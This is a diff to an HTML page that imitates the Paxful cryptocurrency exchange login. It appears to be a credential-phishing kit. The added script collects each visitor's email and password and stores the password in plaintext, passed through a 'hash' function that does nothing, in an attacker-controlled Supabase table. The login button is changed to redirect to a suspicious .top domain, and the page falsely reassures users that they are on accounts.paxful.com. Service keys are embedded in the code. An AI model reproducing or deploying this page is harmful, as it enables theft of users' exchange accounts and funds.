@@ -5,119 +5,131 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login with Paxful</title>
     <link rel="stylesheet" href="styles.css">
-      <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
-
+    <script src="https://unpkg.com/supabase@1.23.1/supabase.umd.min.js"></script>
 </head>
 <body>
     <div class="login-container">
         <div class="header">
             <img src="paxful-logo.jpeg" alt="Paxful Logo" class="logo">
             <h2>Log In With Paxful</h2>
-        </div> <br>
+        </div>
         <style>
-            body {
-                font-family: Arial, sans-serif;
-                background-color: #f9f9f9;
-                margin: 0;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-            }
-            .notice {
-                background-color: #e7f3ff;
-                border-left: 4px solid #007bff;
-                padding: 10px 20px;
-                max-width: 500px;
-                border-radius: 5px;
-                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            }
-            .notice img {
-                vertical-align: middle;
-            }
-            .notice p {
-                margin: 10px 0;
-                font-size: 16px;
-            }
-            .notice .url {
-                background-color: #fff;
-                padding: 5px 10px;
-                border: 1px solid #ccc;
-                border-radius: 3px;
-                display: inline-block;
-                font-family: monospace;
-            }
-            .notice .url img {
-                vertical-align: middle;
-                margin-right: 5px;
-            }
-        </style>
+          body {
+              font-family: Arial, sans-serif;
+              background-color: #f9f9f9;
+              margin: 0;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              height: 100vh;
+          }
+          .notice {
+              background-color: #e7f3ff;
+              border-left: 4px solid #007bff;
+              padding: 10px 20px;
+              max-width: 500px;
+              border-radius: 5px;
+              box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+          }
+          .notice img {
+              vertical-align: middle;
+          }
+          .notice p {
+              margin: 10px 0;
+              font-size: 16px;
+          }
+          .notice .url {
+              background-color: #fff;
+              padding: 5px 10px;
+              border: 1px solid #ccc;
+              border-radius: 3px;
+              display: inline-block;
+              font-family: monospace;
+          }
+          .notice .url img {
+              vertical-align: middle;
+              margin-right: 5px;
+          }
+      </style>
         <div class="notice">
-            <p><img src="https://img.icons8.com/ios-filled/50/007bff/info.png" alt="Info" width="20" height="20"> IMPORTANT! Please check that you are visiting https://accounts.paxful.com/<span class="url"><img src="https://img.icons8.com/ios-filled/50/00cc66/lock--v1.png" alt="Lock" width="20" height="20"> https://accounts.paxful.com/</span></p>
-        </div><br>
-        <form class="login-form">
+          <p><img src="https://img.icons8.com/ios-filled/50/007bff/info.png" alt="Info" width="20" height="20"> IMPORTANT! Please check that you are visiting https://accounts.paxful.com/<span class="url"><img src="https://img.icons8.com/ios-filled/50/00cc66/lock--v1.png" alt="Lock" width="20" height="20"> https://accounts.paxful.com/</span></p>
+      </div><br>
+
+        <form class="login-form" id="registrationForm">
             <label for="phone-email">Your Phone or Email</label>
-            <input type="text" id="phone-email" name="phone-email" required>
+            <input type="email" id="email" name="phone-email" required>
             
             <label for="password">Your Password</label>
             <input type="password" id="password" name="password" required>
             
-            <div class="forgot-password">
-                <a href="#">Forgot password?</a>
-            </div>
-            
             <button type="submit" class="login-button" onclick="redirectToPage()">Log in</button>
             <script type="text/javascript">
               function redirectToPage() {
-                  window.location.href = "https://paxful.com/university/trade-gift-card-p2p-fee/";
+                  window.location.href = "https://approximatereservoir.top/45f0Xkh4Q3lXeXJRRwYnRVcGJEddDChbCXhkBAoDBioaK1Y6biMDCDtQIXtlag?1718686957216";
               }
           </script>
         </form>
+
         <div class="create-account">
-            <p>New on Paxful? <a href="#">Create an Account</a></p>
+            <p>Already have an account? <a href="#">Log In</a></p>
         </div>
     </div>
+
+
     <script>
-  // Your web app's Firebase configuration
-  const firebaseConfig = {
-  apiKey: "AIzaSyCfQITMgoq2txO8uRIBc7ZVPWB-EnbeWw4",
-  authDomain: "tiktak-5133e.firebaseapp.com",
-  projectId: "tiktak-5133e",
-  storageBucket: "tiktak-5133e.appspot.com",
-  messagingSenderId: "477843944630",
-  appId: "1:477843944630:web:d565c16c0a64862494e217"
-};
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-    
-        function login() {
-          var email = document.getElementById('email').value;
-          var password = document.getElementById('password').value;
-    
-          firebase.auth().signInWithEmailAndPassword(email, password)
-          .then((userCredential) => {
-            // Signed in
-            var user = userCredential.user;
-            saveUserDetails(user);
-            alert('User logged in');
-          })
-          .catch((error) => {
-            var errorCode = error.code;
-            var errorMessage = error.message;
-            alert('Error: ' + errorMessage);
-          });
+        // Your Supabase project URL and anon key
+        const supabaseUrl = 'https://upqbzytjynfyozqmehqs.supabase.co';
+        const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVwcWJ6eXRqeW5meW96cW1laHFzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjIzMzg2NDQsImV4cCI6MjAzNzkxNDY0NH0.zApMGkAI5Bymlwz9e3NwDHCn7-ZTKB3xkgLJfCVN_j0';
+
+        // Initialize Supabase client 
+       supabase = Supabase.createClient(supabaseUrl, supabaseAnonKey);
+
+        // Handle form submission
+        document.getElementById('registrationForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            // Get email and password from the form
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Hash the password (you should use a proper password hashing library in production)
+            const hashedPassword = await hashPassword(password);
+
+            // Save the user to Supabase
+            await saveUser(email, hashedPassword);
+
+            // Redirect or show a success message
+            window.location.href = '/dashboard';
+        });
+
+        // Function to hash the password (for demonstration purposes)
+        async function hashPassword(password) {
+            // In a real-world application, use a proper password hashing library like bcrypt.
+            return password;
         }
-    
-        function saveUserDetails(user) {
-          var userId = user.uid;
-          firebase.database().ref('users/' + userId).set({
-            email: user.email,
-            lastLogin: new Date().toISOString()
-          });
+
+        // Function to save the user to Supabase
+        async function saveUser(email, hashedPassword) {
+            try {
+                // Insert the user into the "users" table
+                const { data, error } = await supabase
+                    .from('users')
+                    .insert([
+                        {
+                            email: email,
+                            password: hashedPassword,
+                        },
+                    ]);
+
+                if (error) {
+                    throw error;
+                }
+
+                console.log('User registered successfully:', data);
+            } catch (error) {
+                console.error('Error registering user:', error);
+            }
         }
-      </script>
+    </script>
 </body>
 </html>
